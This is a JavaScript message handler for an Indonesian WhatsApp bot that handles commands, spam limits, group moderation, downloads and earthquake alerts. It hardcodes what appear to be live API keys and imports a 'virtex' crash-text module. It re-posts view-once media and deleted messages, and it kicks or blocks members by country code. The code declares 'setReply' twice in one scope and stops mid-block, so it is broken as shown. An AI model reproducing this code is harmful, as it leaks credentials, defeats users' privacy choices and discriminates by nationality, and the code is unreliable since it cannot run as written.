 "use strict";
import {generateWAMessageFromContent} from "baileys"
import toMs from 'ms'
import chalk from 'chalk'
import fs from "fs"
import fse from 'fs-extra'
import moment from "moment-timezone"
import imageToBase64 from 'image-to-base64'
import util from "util"
import { exec, spawn } from "child_process"
import axios from "axios"
import yts from "yt-search"
import speed from "performance-now"
import ms from "parse-ms"
import ytdl from 'ytdl-core'
import os from 'os'
import { performance } from 'perf_hooks'
import fetch from 'node-fetch'
import cheerio from  'cheerio'
import request from "request"
//import { fromBufferv1 } from "file-type"
import { join, dirname } from 'path'
import path  from 'path'
import maker from 'mumaker'
import fdl from "caliph-api"
import { delRequireCache } from 'delete-node-require-cache'
import * as logs from './logs.js'
import { createRequire } from 'module'
import gis from "g-i-s"
import FormData from 'form-data'
//import nodeDT from "formdata-node"
import stream from 'stream'
import ai2d from '@arugaz/ai2d'
import { Brainly } from "brainly-scraper-v2"
const brainly = new Brainly("id");  
import ameClient from "amethyste-api"
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
import { BitlyClient } from 'bitly'
const bitly = new BitlyClient('7d737131e678fc366699edead8bca146e69f6c78', {});
import { fileURLToPath, URL } from 'url'
//import frombuffer from 'file-type'
const __dirname = dirname(fileURLToPath(import.meta.url))
var require = createRequire(import.meta.url) //Bring in the ability to create the 'require' method
const forward = {forwardingScore: 99999, isForwarded: true, sendEphemeral: true}

//----------------- LIB FILE ------------------\\
import {formatp,parseMention, getRandom,generateProfilePicture, getCase,runtime,FileSize,h2k, makeid,kyun,randomNomor,jsonformat, isUrl, fetchJson,pickRandom,getGroupAdmins, sleep,getBuffer} from "../lib/myfunc.js" 
import {TelegraPh} from '../lib/uploader.js'
import _data from "../lib/totalcmd.js"
import _sewa from '../lib/sewa.js'
import _prem from "../lib/premium.js"
import _scrape from '../lib/scraper.js'
import _error from "../lib/totalerror.js"
import _blockcmd from "../lib/blockcmd.js"
import _spam from '../lib/antispam.js'
import { UploadFileUgu } from '../lib/uploader.js'
import _ban from "../lib/banned.js"
//import mess from "./message.js" 
import {register} from "./register.js"
/*const { bad, menu ,thanks,dosa,katamalem, katasiang, katasore,ohayo,ilhamberkata, ngebucin, katabijak, katagalau, fakta, bokep, devoloper1, apikey} = await import("../messages.js");*/




//------------------ VIRTEX FILE ------------------\\
//virtex by tsukasa
import { virtex8 } from './virtex.js'
const thumb = fs.readFileSync('./stik/thumb.jpeg')
var publik = true

//=================================================//
export const Fearless = async(conn, m, chatUpdate, store) => {
try {
	
//Database
  
const AntiSpam = db.data.antispam
const DataId = db.data.data
const ban = db.data.banned
const premium = db.data.premium
const listcmdblock = db.data.blockcmd 
const listerror = db.data.listerror
const hitnya = db.data.hittoday
const dash = db.data.dashboard 
const anonChat = db.data.anonymous 
const allcommand = db.data.allcommand 
  const _scommand = []
const sewa = db.data.sewa
const spammer = []
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
  }

const xdev = conn  
var Ownerin =`${nomerOwner2}@s.whatsapp.net`
var ownerNumber = [`${nomerOwner}@s.whatsapp.net` ,`${nomerOwner2}@s.whatsapp.net`,`${nomerOwner2}@s.whatsapp.net`,`${conn.user.jid}`]
const Tnow = (new Date()/1000).toFixed(0)
const seli = Tnow - m.messageTimestamp.low
if (seli > Intervalmsg) return console.log((`Pesan ${Intervalmsg} detik yang lalu diabaikan agar tidak nyepam`))

const { type,args, reply,sender,ucapanWaktu,from,botNumber,senderNumber,groupName,groupId,groupMembers,groupDesc,groupOwner,pushname,itsMe,isGroup,mentionByTag,mentionByReply,users,budy,content,body } = m

var prefix = /^[#+,.=''!¦|/\\©^]/.test(body) ? body.match(/^[#+,.=''!¦|/\\©^]/gi) : '.'
var thePrefix = "Multi Prefix"
const isCmd = body.startsWith(prefix)
const isCommand = isCmd? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() :""
const q = args.join(' ')
  const bb = args.join(' ')
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const isOwner = ownerNumber.includes(sender) || _data.checkDataId ("owner", sender, DataId) 
const command = isOwner? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
const theOwner = sender == Ownerin
const { dev, mek} = m
const text = args.join(" ")
const timestampp = speed();
const latensi = speed() - timestampp
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001) 
const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
const Input = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false 
const replyCommand = isCmd? isCmd : allcommand.includes(toFirstCase(command))
const selectedButton = (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : ''
const user = global.db.data.users[m.sender] 
const settings = global.db.data.settings['settingbot']
//Import message.js
await (await import('./message.js')).default(prefix,command)
//Import allfake.js
await (await import('./allfake.js')).default(m, command)
  //THUMB
  const its = fs.readFileSync('./stik/thumb.jpg')
  
//Register terlebih dahulu sebelom pakai bot
register(m,makeid,isCmd,isOwner)
  
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isText = (type == 'conversation')
const isReaction = (type == 'reactionMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessage')

//Security / Keamanan
const isBotGroupAdmins = isGroup ? m.isBotAdmin : false
const isGroupOwner = isGroup ? m.isRAdmin : false
const isGroupAdmins = isGroup ? m.isAdmin : false
const isAntiLink = isGroup ? db.data.chats[from].antilink : false
const isAntidelete = isGroup ? db.data.chats[from].antidelete : false
const isKickarea = isGroup ? db.data.chats[from].antiasing : false
const isAntilinkGc = isGroup ? db.data.chats[from].antilinkgc : false
const isBanchat = isGroup ? db.data.chats[from].banchat : false 
const isAntiVirtex = isGroup ? db.data.chats[from].antivirtex : false
const isAntihidetag = isGroup ? db.data.chats[from].antihidetag : false
const isAntiViewOnce = isGroup ? db.data.chats[from].viewonce : false
const isBanned = sender? _ban.check(senderNumber, ban) : false
const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
const gcount = isPremium ? gcounti.prem : gcounti.user
  
//User 
const userLevel = user? db.data.users[m.sender].level : false
const userExp = user? db.data.users[m.sender].exp : false
const userId = user? db.data.users[m.sender].id : false
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 1000 * userLevel
const userPersen = userExp/requiredExp*100
const userVerified = user? db.data.users[m.sender].date : false

  
//Bot hanya merespon jika button miliknya saja yang di tekan 
if(m.myButton) {return}

//AUTO Read Message  
conn.readMessages([m.key])

//Presence Online
if (isCmd){
conn.sendPresenceUpdate('composing', from)
} else {
conn.sendPresenceUpdate('available', from)
}


//Public & Self And Banchat
if (!publik && !itsMe && !isOwner && !theOwner) {return} 
if (isGroup && isBanchat && !itsMe && !isOwner) {return}

//Console log
if(!isCmd && !isAllMedia && !isReaction && budy.length < 8000 && type !== 'protocolMessage') logs.message(conn,m,budy,AntiSpam)
if(isCmd) logs.commands(m,command) 
    

 





     
    
    


  
//Set Quoted
if(Qoted === "ftoko"){
var setQuoted = ftoko
} else if(Qoted === "fkontak"){
var setQuoted = fkontak
} else if(Qoted === "ftext"){
var setQuoted = ftext
}else if(Qoted === "ftroli"){
var setQuoted = ftroli
} else if(Qoted === "floc"){
var setQuoted = floc
} else if(Qoted === "fimage"){
var setQuoted = fimage
} else if(Qoted === "m"){
var setQuoted = m
} else if(Qoted === "fdoc"){
var setQuoted = fdoc
}

  try { //To get photo of user
var pporg = await conn.profilePictureUrl(sender, 'image')
} catch (e) {
var pporg = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
  }
  
const setReply = async(result,member = []) =>{ 
let translate = require('@vitalets/google-translate-api');
let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || "Tidak terdeteksi"
  
if(language == "id"){
  
if(!sender.startsWith("62")){
let toks =  translate(result, {to: "en",})
var teks = toks.text
} else {
var teks = result
}

} else {
let toks =  translate(result, {to: language,})
var teks = toks.text
}  

 
const contextInfo = {
forwardingScore: 50, 
isForwarded: true, 
mentionedJid: [sender],
externalAdReply:{
title: copyright,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: pporg,
sourceUrl:`https://chat.whatsapp.com/Bd2mN13f4QV7Mu1vtZ0NuP`,
}
}  

conn.sendMessage(from, { contextInfo, text: teks },{quoted: setQuoted})
}

  
//SetReply
const setReply = async(result,member = []) =>{ 
let translate = require('@vitalets/google-translate-api');
let data = global.db.data.others.runtime
let time = (new Date - data.runtime) || "Tidak terdeteksi"
  
if(language == "id"){
  
if(!sender.startsWith("62")){
let toks =  translate(result, {to: "en",})
var teks = toks.text
} else {
var teks = result
}

} else {
let toks =  translate(result, {to: language,})
var teks = toks.text
} 

  
let contextInfo = {
forwardingScore: 50, 
isForwarded: true, 
mentionedJid: member,
externalAdReply:{
showAdAttribution: false, 
title: `Click here `,
body:`Bot menyala selama ${clockString(time)} `,
previewType:"PHOTO",
thumbnail: its,
sourceUrl: `${global.link}`
}
}

if(replyType === "web"){
conn.sendMessage(from, { contextInfo,mentions: member, text: teks }, { quoted: m })
} else if(replyType === "web2"){
conn.sendMessageV2(from, {contextInfo,mentions: member,text: teks},{quoted: m })
} else if(replyType === "mess"){
conn.sendMessage(from, {text: teks}, { quoted: m });
} else if(replyType === "quoted"){
conn.sendMessage(from,{ mentions: member,text: teks}, { quoted: setQuoted });
} else {
conn.sendMessage(from, {text: "Error SetReply Tidak Di Temukan"})
}
}
 

 
	
const math = (teks) => {
return Math.floor(teks)
}  
      
const conteximg = {
 contextInfo:
 { externalAdReply: 
 { showAdAttribution: true,
title: `${global.wm} , ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,
body:`⌜ ${ucapanWaktu} ⌟`,
previewType:"PHOTO",
thumbnail: its,
sourceUrl: global.link}}}

//onlyOwner
const onlyOwner = async() =>{
setReply(mess.only.ownerB)
}

  
//Bot tidak bisa di akses di pc kecuali premium
/*if(!isGroup && !isPremium && isCmd) {
let teks = `Kamu bukan user premium
silahkan upgrade ke premium agar bisa menggunakan 
bot secara private chat, terimakasih

${fake}`
return seReply(teks)
}*/

 //ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
if(ownerNumber.includes(sender)) return setReply('Alah sia owner bot mah bebas yekan :v')
let linkgc = await conn.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
await setReply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf kamu di kick dari grup :(`)
await sleep(3000)
if(isBotGroupAdmins) await conn.sendMessage(from, { delete: m.key })
await conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}   

   let checkDataName = function(nama, idgc, claim) {
    let status = false
    Object.keys(claim).forEach((i) => {
        if (claim[i].name === nama) {
            status = true
        }
    })
return status
   }

   let createDataId= (nama,_level) => {                                                                                                                      
 let obj = { name: nama, id: [] }
_level.push(obj)
//fs.writeFileSync('./database/data.json', JSON.stringify(_level))
   }
  //Function untuk update gempa BMKG
let gempa = db.data.others['updateGempa']
let data1 = db.data.others['infogempa']
if(!gempa) db.data.others['updateGempa'] = []

if(gempa && gempa.length > 0){

setInterval(async() => {
const {data} = await axios.get("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json")
let nana = /TimurLaut|Tenggara|BaratDaya|BaratLaut|Utara|Timur|Selatan|Barat/
let lokasi = data.Infogempa.gempa.Wilayah.split("km")[1].replace(nana,"").replace(" ",'').replace(" ","")
let waktu = data.Infogempa.gempa.Jam
let caption = ` *Broadcast Gempa Terkini 🌐*

📅 *Tanggal:* ${data.Infogempa.gempa.Tanggal}
⌚ *Waktu:* ${data.Infogempa.gempa.Jam}
📍 *Kordinat:* ${data.Infogempa.gempa.Coordinates}
⛰️ *Magnitudo:* ${data.Infogempa.gempa.Magnitude}
🕳️ *Kedalaman:* ${data.Infogempa.gempa.Kedalaman}
🚩 *Lokasi:* ${data.Infogempa.gempa.Wilayah}
🌊 *Potention:* ${data.Infogempa.gempa.Potensi}
💡 *Effect:* ${data.Infogempa.gempa.Dirasakan}
`

if(data1){
let getGroups = await conn.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
const image = {url:"https://data.bmkg.go.id/DataMKG/TEWS/" + data.Infogempa.gempa.Shakemap}
  
if(data1.lokasi !== lokasi && data1.lokasi !== waktu){
 
data1.lokasi = lokasi
data1.waktu = waktu
  
for(let i of gempa){
if(!anus.includes(i)) {
gempa.splice(gempa.indexOf(i,1)) 
console.log("menghapus auto update gempa pada group")
} else {
await sleep(2000)
conn.sendMessage(i,{image,caption}) 
}
}
}

  
} else {
let getGroups = await conn.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)

db.data.others['infogempa'] = {
lokasi : lokasi,
waktu: waktu
}

  
for(let i of gempa){
if(!anus.includes(i)) {
gempa.splice(gempa.indexOf(i,1)) 
console.log("menghapus auto update gempa pada group")
} else {
await sleep(2000)
conn.sendMessage(i,{image,caption}) 
}
}
 
} 

}, 60_000*10)// akhir dari set interval

}// akhir dari gempa.length
  const sendListMessage = (jid, button, rows, quoted, options = {}) => {
		const sections = [
			{
				title: button.title,
				rows: [...rows]
			}
		]
		const listMessage = {
			text: button.description,
			footer: button.footerText,
			mentions: conn.parseMention(button.description, button.footerText),
			title: '',
			buttonText: button.buttonText,
			sections
		}
		conn.sendMessage(jid, listMessage, {
			quoted,
			...options 
		})
	}
  

 //ANTI LINK 
if (isGroup && isAntiLink){
if (budy.includes(`https:`)) { 
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
if(ownerNumber.includes(sender)) return setReply('Alah sia owner bot mah bebas yekan :v')
let linkgc = await conn.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
setTimeout(() => {
if(isBotGroupAdmins) conn.sendMessage(from, { delete: m.key })
conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}
}

 //ANTI ASING
if (isGroup && isBotGroupAdmins &&isKickarea && !itsMe) {    
let member = await groupMembers.map(u => u.id)
for ( let i = 0; i <member.length; i++){  
if (member[i].slice(0,2) !== "62" ){     	
let usersId = await groupMembers.find(u => u.id == member[i]) 
if (!usersId.groupAdmins ){
await conn.groupParticipantsUpdate(from, [member[i]], 'remove')
await sleep(1000)
}
}
} 
}  

//ANTI VIRUS
if (isGroup && isAntiVirtex && budy.length > 20000) {
if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
const antivirus  = require('./antivirus.js')  
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
await conn.sendMessage(from, {text:antivirus(pushname,groupName)})
if (!isBotGroupAdmins) {return }
if(isOwner) {return}
await conn.groupParticipantsUpdate(from, [sender], 'remove')
await conn.sendMessage(`${nomerOwner}@s.whatsapp.net`,{text: `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`})
}

  
//ANTI DELETE 
if(type == 'protocolMessage' && isAntidelete){
//Log(m.message.protocolMessage)
let mess = chatUpdate.messages[0].message.protocolMessage
let chats = Object.entries(await conn.chats).find(([user, data]) => data.messages && data.messages[mess.key.id])
if(chats[1] == undefined) return
if(chats[1] !== undefined){
let msg = JSON.parse(JSON.stringify(chats[1].messages[mess.key.id]))
await conn.copyNForward(mess.key.remoteJid, msg).catch(e => console.log(e, msg))
}
}


//ANTI VIEWONCE 
if ((type == 'viewOnceMessage' || isQuotedViewOnce) && (isAntiViewOnce || budy.startsWith("Readviewonce"))) {
const { downloadContentFromMessage } = (await import('baileys')).default
if(isQuotedViewOnce){
var view = m.quoted.message
} else {
var view = m.message.viewOnceMessage.message
} 

let Type = Object.keys(view)[0]
let media = await downloadContentFromMessage(view[Type], Type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(Type)) {
conn.sendFile(m.chat, buffer, 'media.mp4', view[Type].caption || '', m)
} else if (/image/.test(Type)) {
conn.sendFile(m.chat, buffer, 'media.jpg', view[Type].caption || '', m)
}
}

  
  
//===================================================================//

async function pinterest(query) {
	return new Promise((resolve, reject) => {
	  let err = { status: 404, message: "Terjadi kesalahan" }
	  gis({ searchTerm: query + ' site:id.pinterest.com', }, (er, res) => {
	   if (er) return err
	   let hasil = {
		  status: 200,
		  creator: 'chibot',
		  result: []
	   }
	   res.forEach(x => hasil.result.push(x.url))
	   resolve(hasil)
	  })
	})
}


const addSpammer = function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
_db[position].spam += 1
 } else {
let bulin = ({ id: jid, spam: 1 })
 _db.push(bulin)     
}
}

const FinisHim = async function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
if(_db[position].spam > 7){
if(db.data.users[sender].banned.status || !isOwner){return}
let obj = {
id: senderNumber,
status: true,
date: calender,
reason: "Spam Bot"
}
db.data.users[woke].banned = obj               
console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
setReply("Kamu telah di banned karena telah melakukan spam")
}
} else {
console.log(`Spam ke ${_db[position].spam}`)
}
}

  
//ANTI SPAM BERAKHIR
if(_spam.Expired(senderNumber, "Case", AntiSpam)){
let position = false
for(let i of spammer){
if(i.id == senderNumber){
position = i
}
}
    
if (position !== false) {
spammer.splice(position, 1)
console.log(chalk.bgGreen(color("[  Remove ]", "black")),"Sukses remove spammer")
}
}

_spam.Expired(senderNumber, "NotCase", AntiSpam)
if(isBanned && !isOwner){return} //user terbanned
if(isCmd && _spam.check("Case",senderNumber, AntiSpam)){
addSpammer(senderNumber, spammer)
FinisHim(senderNumber, spammer)
return console.log(chalk.bgYellowBright(chalk.black("[  SPAM  ]")),"antispam Case aktif")
}

//ANTI SPAM PRIVATE CHAT
if(antiSpam && isCmd && _spam.isFiltered(from) && !isGroup && !itsMe && !isOwner){
_spam.add("Case",senderNumber, "15 s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}

//ANTI SPAM GROUP CHAT     
if (antiSpam && isCmd && _spam.isFiltered(from) && isGroup && !itsMe && !isOwner) {
_spam.add("Case",senderNumber, "15s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}
if (isCmd && !isOwner) _spam.addFilter(from)



//System Expired
_sewa.expiredCheck(conn, sewa)
_prem.expiredCheck(premium) 


//Make Sticker
async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await conn.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
}
//APK DL
  async function apkDl(url) {
	let res = await fetch('https://apk.support/gapi/index.php', {
		method: 'post',
		body: new URLSearchParams(Object.entries({ x: 'downapk', t: 1, google_id: url, device_id: '', language: 'en-US', dpi: 480, gl: 'SUQ=', model: '', hl: 'en', de_av: '', aav: '', android_ver: 5.1, tbi: 'arm64-v8a', country: 0, gc: undefined }))
	})
	let $ = cheerio.load(await res.text())
	let fileName = $('div.browser > div.dvContents > ul > li > a').text().trim().split(' ')[0]
	let download = $('div.browser > div.dvContents > ul > li > a').attr('href')
	if (!download) throw 'Can\'t download the apk!'
	let mimetype = (await fetch(download, { method: 'head' })).headers.get('content-type')
	return { fileName, mimetype, download }
  }
		const uploadSCRAP = async (buffer) => {
let {
ext
} = await frombuffer(buffer)

      let form = new FormData

      form.append('file', buffer, 'tmp.' + ext)

      let res = await fetch('https://telegra.ph/upload', {

         method: 'POST',

         body: form

      })

      let img = await res.json()

      if (img.error) throw img.error

      return 'https://telegra.ph' + img[0].src

    }
//DOWNLOAD MP4
const downloadMp4 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp4File = getRandom('.mp4') 
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on("finish", async () => {    
await conn.sendMessage(from, { video: fs.readFileSync(mp4File), caption: "Nih!",gifPlayback: false},{quoted: m})
fs.unlinkSync(`./${mp4File}`)
})     
} catch(err) {
setReply(`${err}`)
}
}


//DOWNLOAD MP3
const downloadMp3 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp3File = getRandom('.mp3') 
ytdl(Link, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
await conn.sendMessage(from, {audio:  fs.readFileSync(mp3File), mimetype: 'audio/mpeg' },{ quoted: m })
fs.unlinkSync(mp3File)
})       
} catch (err){
console.log(color(err))
}
} 

  //
function quotesAnime() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}
  
//AUTO BIO BOT
if(settings){
} else global.db.data.settings['settingbot'] = { status: new Date() * 1, }
if ((new Date() * 1 - settings.status > 2000) && settings && settings.autoBio) {
const {kyun} = await import("../lib/myfunc.js")
let _uptime = process.uptime() 
let uptime = kyun(_uptime);
let bio = `Im ${fake} 🤖 || ⏰ Runtime ${uptime} || 🌎 Mode: ${publik? 'Public' : 'self'} || 🎨 Create By ${ownerName}`
await conn.updateProfileStatus(bio).catch(_ => _)
settings.status = new Date() * 1
}

 

//AUTO DEL VIRTEX
if(m.virtex) {
if(isGroup && isBotGroupAdmins) conn.sendMessage(from, { delete: m.key})
if(!isGroup) conn.chatModify({ clear: { messages: [{ id: m.id, fromMe: sender == botNumber? true : false, timestamp: m.messageTimestamp }] } }, sender, [])
console.log(chalk.bgRedBright(chalk.black("[ VIRTEXT ]")),`Length: ${budy.length} from ${senderNumber} ${isGroup? `Group ${groupName}`: ""}`)
}
 

//AUTO BLOCK NOMER ASING +212
let nomerAsing = senderNumber.startsWith('+212')
if (nomerAsing) {
console.log(`Nomer asing dari ${senderNumber}`)
await m.reply("you are not allowed to using this bot")
if(!isGroup) await conn.sendMessage(from, {text: "stupid"},{quoted: lep})
return conn.updateBlockStatus(sender, "block") 
} 

//ANONYMOUS CHAT
const roomChat = Object.values(anonChat).find(room => [room.a, room.b].includes(m.sender) && room.state == 'CHATTING')
const roomA = Object.values(anonChat).find(room => room.a == m.sender)
const roomB = Object.values(anonChat).find(room => room.b == m.sender )
const room = Object.values(anonChat).find(room => room.state == 'WAITING' && room.b == "")

if (roomChat && !isCmd && !isGroup && roomChat.b !=="") {
//let nono = m.quoted.fakeObj? m.quoted.fakeObj : m
let other = [roomChat.a, roomChat.b].find(user => user !== m.sender)
m.copyNForward(other, true)
}

if (room && Date.now() >= room.expired){
await conn.sendMessage(room.a, {text:"Partner tidak di temukan\nKamu telah keluar dari room anonymous"})
anonChat.splice(anonChat.indexOf(room, 1)) 
}

//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return setReply(mess.block.Bsystem)
} else{
return setReply(mess.block.Bowner)
}
}
}

//FITUR USER PREMIUM
if(!_data.checkDataName("premium", "", DataId)) { 
await _data.createDataId("premium", DataId) 
}
let userPremium =  DataId.filter(item => item.name == "premium" )
for(let i of userPremium[0].id){
if(command == i && !isPremium) return setReply(`Kamu bukan user premium`)
}

//FITUR KHUSUS OWNER
if(!_data.checkDataName("commands", "", DataId)) { 
await _data.createDataId("commands", DataId)
}
let ownerCommands =  DataId.filter(item => item.name == "commands" )
for(let i of ownerCommands[0].id){
if(command == i && !isOwner) return onlyOwner()
} 

//FITUR USER LIMIT
if(!_data.checkDataName("limit", "", DataId)) { 
await _data.createDataId("limit", DataId) 
}
let userLimit =  DataId.filter(item => item.name == "limit" )
for(let i of userLimit[0].id){
if(!isOwner && command == i ){
if(!isPremium && db.data.users[sender].limit < 1) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!isPremium) {
db.data.users[sender].limit -= 1
conn.sendMessage(from,{text:`Limit kamu berkurang 1`}, {quoted: m})
}
  
}
}

//USER AFK
if (user && user.afk > -1) {
setReply(`Kamu telah berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afk)}`.trim())
user.afk = -1
user.afkReason = ''
}
let jids = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of jids) {
let userAfk = global.db.data.users[jid]
if (!userAfk) continue
let afkTime = userAfk.afk
if (!afkTime || afkTime < 0) continue
let reason = userAfk.afkReason || ''
 setReply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
} 

//AUTO REACT
let regex =["p","y"]
for (let i of regex){
if (!_spam.check("NotCase",senderNumber, AntiSpam) && isGroup && budy.toLowerCase().includes(i)){ 
_spam.add("NotCase",senderNumber, "10s", AntiSpam)
let emot = await pickRandom(["🗿", "👍", "🙄", "😝", "😏", "💩", "👻", "🔥", "🤣","🤬", "😎", "😂", "😘", "😑", "😱", "❤️", "🔥", "😳","😍","🤩","🥳","🤔","🤗","🤤","👎","👊","🙈","🤡"])
//conn.sendMessage(from, { react: { text: emot, key: m.key } })	
}
}

//AUTO RESPON SIMI VIA REPLY/TAG BOT
const isReplySticker = type === 'stickerMessage' && content.includes('stickerMessage')
const isQuotedReplySticker = type === 'stickerMessage' && content.includes('extendedTextMessage')
const mentionByReplySticker = type == "stickerMessage" && m.message.stickerMessage.contextInfo != null ? m.message.stickerMessage.contextInfo.participant || "" : ""
if (Input == botNumber && isGroup && !replyCommand && !isAudio || mentionByReplySticker == botNumber && isSticker && !replyCommand) {
try{	
await sleep(2000)
conn.sendPresenceUpdate('composing', from) 
if(isQuotedReplySticker || isReplySticker ){
await sleep(2000)
let namastc = await pickRandom(Object.keys(db.data.sticker))
conn.sendMessage(from, {sticker: {url:db.data.sticker[namastc].link}}, {quoted:m })
} else{
let jawab = ["Afa iyah 🗿","Oh","Aku ga ngerti om 🐦","Boong","🗿","🐦","Oh gitu 🐦"]        
let teks1 = pickRandom(jawab)
let teks2 = body
let hasil = [`${teks1}`,`${teks2}`]
let random = pickRandom(hasil)
  //console.log(idnya)
let kata = body.replace(`@${botNumber.split("@")[0]}`, "")
let kato = ["Kenapa ?","Ha ?","Napa tag gua ?","napa ?","ya ?","apa ?","Hmm ?"]
let acak = pickRandom(kato)
if(kata == "") return conn.sendMessage(from,{text: acak},{quoted: m})  
  let kat0o = ["Kenapa Tag owner gw 😡","Dia sibuk jangan di ganggu!!!!","Jangan tag tag dia!!!!!!","napa tag owner gw??"]
let accak = pickRandom(kat0o)
if(kata == "") return conn.sendMessage(from,{text: accak},{quoted: m})  
let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${kata}&lc=id`, {methods: "GET"})
let sami = simi.success  
 if(sami.startsWith("Aku tidak mengerti")){
var teksnya = random
} else {
var teksnya = sami
}
await sleep(2000)
conn.sendMessage(from,{text: teksnya},{quoted: m})  
//setReply(`${teksnya}`)
}
